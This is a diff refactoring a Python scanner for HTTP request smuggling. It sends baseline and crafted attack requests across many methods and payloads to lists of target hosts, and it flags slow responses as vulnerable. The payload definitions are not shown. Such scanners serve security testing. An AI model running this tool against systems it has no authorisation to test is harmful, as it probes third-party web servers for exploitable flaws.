+    content_type = r.t_headers.get("Content-Type", "-")
+    label = f"{payload['name']}|{method}" if payload else method
+    vuln_flag = "VULNERABLE" if r_type == "vulnerable" else "-"
+
+    line = (
+        f"{r.url.ljust(state['url_max_len'])}\t\t"
+        f"M={label}\t\t"
+        f"C={r.status_code}\t\t"
+        f"L={r.length}\t\t"
+        f"time={r.time:.0f}\t\t"
+        f"T={content_type}\t\t"
+        f"V={vuln_flag}\n"
+    )
+
+    verbose = config["verbose"]
+    if verbose >= 2 or (verbose >= 1 and r_type == "vulnerable"):
+        sys.stdout.write(f"{fg(COLORS[r_type])}{line}{attr(0)}")
+
+    with open(state["output_file"], "a+") as fp:
+        fp.write(line)
+        if r_type == "vulnerable":
+            fp.write(f">>>{r.message}<<<\n")
+
+    if verbose >= 3 or (verbose >= 2 and r_type == "vulnerable"):
+        sys.stdout.write(f"{fg('dark_gray')}>>>{r.message}<<<{attr(0)}\n")
+    if verbose >= 4:
+        sys.stdout.write(f"{fg('dark_gray')}>>>{r.response}<<<{attr(0)}\n")
+
+
+# ---------------------------------------------------------------------------
+# Core Test Logic
+# ---------------------------------------------------------------------------
+
+def test_url(url: str, am: AttackMethod):
+    time.sleep(0.01)
+
+    if config["verbose"] <= 1:
+        sys.stdout.write(
+            f"progress: {state['n_current']}/{state['n_total']}\r"
+        )
+    state["n_current"] += 1
+
+    state["exceptions"].setdefault(url, 0)
+    state["vulnerable"].setdefault(url, 0)
+
+    if url in state["history"]:
+        return
+    state["history"].append(url)
+
+    base_msg = build_base_message(url, config["base_headers"])
+
+    # Send a reference (baseline) request
+    ref = SockRequest(url, base_msg)
+    ref.send()
+    if ref.status_code < 0:
+        state["exceptions"][url] += 1
     else:
-        query = '/'
-    if t_urlparse.query:
-        query = query + '?' + t_urlparse.query
-    if t_urlparse.fragment:
-        query = query + '#' + t_urlparse.fragment
+        print_result(ref, "ref", "", {})
 
-    msg = 'POST ' + query + ' HTTP/1.1' + CRLF
-    msg = msg + 'Host: ' + t_urlparse.netloc + CRLF
+    # Try every method × payload combination
+    for method in config["methods"]:
+        for payload in ATTACK_PAYLOADS:
+            if state["exceptions"][url] >= MAX_EXCEPTION:
+                if config["verbose"] >= 2:
+                    print(f"skip (too many exceptions): {url}")
+                return
+            if state["vulnerable"][url] >= MAX_VULNERABLE:
+                if config["verbose"] >= 2:
+                    print(f"skip (already vulnerable): {url}")
+                return
 
-    for k,v in t_evil_headers.items():
-        msg = msg + k + ': ' + v + CRLF
-    msg = msg + CRLF
-
-    return msg
-
-
-def testURL( url ):
-    time.sleep( 0.01 )
-
-    if _verbose <= 1:
-        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
-        t_multiproc['n_current'] = t_multiproc['n_current'] + 1
-        # sys.stdout.write( '\n' )
-
-    if not url in t_exceptions:
-        t_exceptions[url] = 0
-
-    if not url in t_vulnerable:
-        t_vulnerable[url] = 0
-
-    if url in t_history:
-        return False
-    t_history.append( url )
-
-    base_message = generateBaseMessage( url, t_base_headers )
-
-    # reference request (we don't care)
-    r = doRequest( url, base_message )
-    if r.status_code < 0:
-        t_exceptions[url] = t_exceptions[url] + 1
-    else:
-        printResult( r, 'ref', '', '' )
-
-    for method in t_methods:
-        for attack_datas in t_attacks_datas:
-            if t_exceptions[url] >= MAX_EXCEPTION:
-                if _verbose >= 2:
-                    print("skip too many exceptions %s" % url)
-                return False
-            if t_vulnerable[url] >= MAX_VULNERABLE:
-                if _verbose >= 2:
-                    print("skip already vulnerable %s" % url)
-                return False
-
-            msg = generateAttackMessage( base_message, method, attack_datas )
-            # print( msg )
+            msg = build_attack_message(base_msg, method, payload, am)
             if not msg:
-                sys.stdout.write( '%smethod not implemented yet: %s%s\n' %  (fg('red'),method,attr(0)) )
+                _err(f"method not implemented: {method}")
                 break
 
-            r = doRequest( url, msg )
+            r = SockRequest(url, msg)
+            r.send()
+
             if r.status_code < 0:
-                t_exceptions[url] = t_exceptions[url] + 1
+                state["exceptions"][url] += 1
             else:
-                if r.time > 5000:
-                # if r.status_code == 500 and r.time > 5000:
-                    color = 'vulnerable'
-                    t_vulnerable[url] = t_vulnerable[url] + 1
-                else:
-                    color = 'attack'
-                printResult( r, color, method, attack_datas )
+                r_type = "vulnerable" if r.time > 5000 else "attack"
+                if r_type == "vulnerable":
+                    state["vulnerable"][url] += 1
+                print_result(r, r_type, method, payload)
 
 
-def doRequest( url, message ):
-    r = sockRequest( url, message )
-    r.send()
-    return r
-
-
-def printResult( r, r_type, method, attack_datas ):
-    if 'Content-Type' in r.t_headers:
-        content_type = r.t_headers['Content-Type']
-    else:
-        content_type = '-'
-
-    payload = method
-    if attack_datas:
-        payload = attack_datas['name'] + '|' + payload
-
-    if r_type == 'vulnerable':
-        vuln = 'VULNERABLE'
-    else:
-        vuln = '-'
-
-    output = '%s\t\tM=%s\t\tC=%d\t\tL=%d\t\ttime=%d\t\tT=%s\t\tV=%s\n' %  (r.url.ljust(u_max_length),payload,r.status_code,r.length,r.time,content_type,vuln)
-    if _verbose >= 2 or ( _verbose>=1 and r_type=='vulnerable' ):
-        sys.stdout.write( '%s%s%s' % (fg(t_colors[r_type]),output,attr(0)) )
-
-    fp = open( t_multiproc['f_output'], 'a+' )
-    if r_type=='vulnerable':
-        output = output + '>>>'+r.message+'<<<\n'
-    fp.write( output )
-    fp.close()
-
-    if _verbose >= 3 or (_verbose >= 2 and r_type=='vulnerable'):
-        sys.stdout.write( '%s>>>%s<<<%s\n' % (fg('dark_gray'),r.message,attr(0)) )
-    if _verbose >= 4:
-        sys.stdout.write( '%s>>>%s<<<%s\n' % (fg('dark_gray'),r.response,attr(0)) )
-
-
-parser = argparse.ArgumentParser()
-parser.add_argument( "-a","--path",help="set paths list" )
-parser.add_argument( "-d","--header",help="custom headers", action="append" )
-parser.add_argument( "-i","--timeout",help="set timeout, default 10" )
-parser.add_argument( "-m","--method",help="set methods separated by comma, default: all" )
-parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
-parser.add_argument( "-s","--scheme",help="scheme to use, default: http,https" )
-parser.add_argument( "-t","--threads",help="threads, default 10" )
-parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
-parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=requests+headers, 4=full debug, default: 1" )
-parser.parse_args()
-args = parser.parse_args()
-
-if args.scheme:
-    t_scheme = args.scheme.split(',')
-else:
-    t_scheme = ['http','https']
-
-if args.timeout:
-    _timeout = int(args.timeout)
-else:
-    _timeout = 30
-
-if args.method:
-    t_methods = args.method.split(',')
-else:
-    t_methods = t_registered_method
-
-t_custom_headers = {}
-if args.header:
-    for header in args.header:
-        if ':' in header:
-            tmp = header.split(':')
-            t_custom_headers[ tmp[0].strip() ] = ':'.join(tmp[1:]).strip()
-t_base_headers.update( t_custom_headers )
-# print(t_base_headers)
-# exit()
-
-t_hosts = []
-if args.hosts:
-    if os.path.isfile(args.hosts):
-        fp = open( args.hosts, 'r' )
-        t_hosts = fp.read().strip().split("\n")
-        fp.close()
-    else:
-        t_hosts.append( args.hosts )
-n_hosts = len(t_hosts)
-sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )
-
-t_urls = []
-if args.urls:
-    if os.path.isfile(args.urls):
-        fp = open( args.urls, 'r' )
-        t_urls = fp.read().strip().split("\n")
-        fp.close()
-    else:
-        t_urls.append( args.urls )
-n_urls = len(t_urls)
-sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )
-
-if n_hosts == 0 and n_urls == 0:
-    parser.error( 'hosts/urls list missing' )
-
-t_path = [ '' ]
-if args.path:
-    if os.path.isfile(args.path):
-        fp = open( args.path, 'r' )
-        t_path = fp.read().strip().split("\n")
-        fp.close()
-    else:
-        t_path.append( args.path )
-n_path = len(t_path)
-sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )
-
-if args.verbose:
-    _verbose = int(args.verbose)
-else:
-    _verbose = 1
-
-if args.threads:
-    _threads = int(args.threads)
-else:
-    _threads = 10
-
-t_totest = []
-t_totest2 = []
-t_history = []
-u_max_length = 0
-d_output =  os.getcwd()+'/smuggler'
-f_output = d_output + '/' + 'output'
-if not os.path.isdir(d_output):
-    try:
-        os.makedirs( d_output )
-    except Exception as e:
-        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
-        exit()
-
-sys.stdout.write( '%s[+] options are -> threads:%d, verbose:%d%s\n' % (fg('green'),_threads,_verbose,attr(0)) )
-
-
-for scheme in t_scheme:
-    for host in t_hosts:
-        for path in t_path:
-            u = scheme + '://' + host.strip() + path
-            t_totest.append( u )
-            l = len(u)
-            if l > u_max_length:
-                u_max_length = l
-
-for url in t_urls:
-    for path in t_path:
-        u = url.strip() + path
-        t_totest.append( u )
-        l = len(u)
-        if l > u_max_length:
-            u_max_length = l
-
-am = attackMethod()
-n_totest = len(t_totest)
-sys.stdout.write( '%s[+] %d urls to test.%s\n' % (fg('green'),n_totest,attr(0)) )
-sys.stdout.write( '[+] testing...\n' )
-
-
-random.shuffle(t_totest)
-# print("\n".join(t_totest))
-# exit()
-
-t_exceptions = {}
-t_vulnerable = {}
-t_multiproc = {
-    'n_current': 0,
-    'n_total': n_totest,
-    'd_output': d_output,
-    'f_output': f_output,
-    '_verbose': _verbose,
-}
-
-def doWork():
+def worker(q: Queue, am: AttackMethod):
     while True:
         url = q.get()
-        testURL( url )
+        test_url(url, am)
         q.task_done()
 
-q = Queue( _threads*2 )
 
-for i in range(_threads):
-    t = Thread( target=doWork )
-    t.daemon = True
-    t.start()
+# ---------------------------------------------------------------------------
+# CLI / Entry Point
+# ---------------------------------------------------------------------------
 
-try:
-    for url in t_totest:
-        q.put( url )
-    q.join()
-except KeyboardInterrupt:
-    sys.exit(1)
-    
-######################################
-##
-##    
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="HTTP Request Smuggling Detection Tool"
+    )
+    parser.add_argument("-a", "--path",    help="File containing URL paths to append")
+    parser.add_argument("-d", "--header",  help="Custom header (key:value)", action="append")
+    parser.add_argument("-i", "--timeout", help="Socket timeout in seconds (default: 30)", type=int, default=30)
+    parser.add_argument("-m", "--method",  help="Comma-separated list of methods (default: all)")
+    parser.add_argument("-o", "--hosts",   help="Host or file of hosts to test")
+    parser.add_argument("-s", "--scheme",  help="Schemes to use, comma-separated (default: http,https)")
+    parser.add_argument("-t", "--threads", help="Number of threads (default: 10)", type=int, default=10)
+    parser.add_argument("-u", "--urls",    help="URL or file of URLs to test")
+    parser.add_argument(
+        "-v", "--verbose",
+        help="Verbosity: 0=silent, 1=vulnerable only, 2=all, 3=+headers, 4=full debug (default: 1)",
+        type=int, default=1,
+    )
+    return parser.parse_args()
+
+
+def load_lines(value: str) -> list[str]:
+    """Returns lines from a file, or a single-item list if not a file path."""
+    if value and os.path.isfile(value):
+        with open(value) as f:
+            return [line.strip() for line in f if line.strip()]
+    return [value] if value else []
+
+
+def main():
+    args = parse_args()
+
+    schemes = args.scheme.split(",") if args.scheme else ["http", "https"]
+    methods = args.method.split(",") if args.method else REGISTERED_METHODS
+
+    base_headers = DEFAULT_HEADERS.copy()
+    for header in args.header or []:
+        if ":" in header:
+            k, _, v = header.partition(":")
+            base_headers[k.strip()] = v.strip()
+
+    hosts = load_lines(args.hosts)
+    urls  = load_lines(args.urls)
+    paths = load_lines(args.path) or [""]
+
+    if not hosts and not urls:
+        print("Error: provide --hosts or --urls")
+        sys.exit(1)
+
+    print(f"{fg('green')}[+] {len(hosts)} host(s) loaded{attr(0)}")
+    print(f"{fg('green')}[+] {len(urls)} URL(s) loaded{attr(0)}")
+    print(f"{fg('green')}[+] {len(paths)} path(s) loaded{attr(0)}")
+
+    # Build the full target list
+    targets: list[str] = []
+    for scheme in schemes:
+        for host in hosts:
+            for path in paths:
+                targets.append(f"{scheme}://{host}{path}")
+    for url in urls:
+        for path in paths:
+            targets.append(url + path)
+
+    url_max_len = max((len(u) for u in targets), default=0)
+
+    # Output directory
+    output_dir  = os.path.join(os.getcwd(), "smuggler")
+    output_file = os.path.join(output_dir, "output")
+    os.makedirs(output_dir, exist_ok=True)
+
+    # Shared config and mutable state
+    global config, state
+    config = {
+        "timeout":      args.timeout,
+        "verbose":      args.verbose,
+        "threads":      args.threads,
+        "methods":      methods,
+        "base_headers": base_headers,
+    }
+    state = {
+        "history":     [],
+        "exceptions":  {},
+        "vulnerable":  {},
+        "n_current":   0,
+        "n_total":     len(targets),
+        "url_max_len": url_max_len,
+        "output_file": output_file,
+    }
+
+    print(
+        f"{fg('green')}[+] threads={args.threads}, verbose={args.verbose}{attr(0)}"
+    )
+    print(f"{fg('green')}[+] {len(targets)} URL(s) to test{attr(0)}")
+    print("[+] testing...\n")
+
+    random.shuffle(targets)
+
+    am = AttackMethod()
+    q: Queue = Queue(args.threads * 2)
+
+    for _ in range(args.threads):
+        t = Thread(target=worker, args=(q, am), daemon=True)
+        t.start()
+
+    try:
+        for url in targets:
+            q.put(url)
+        q.join()
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted.")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
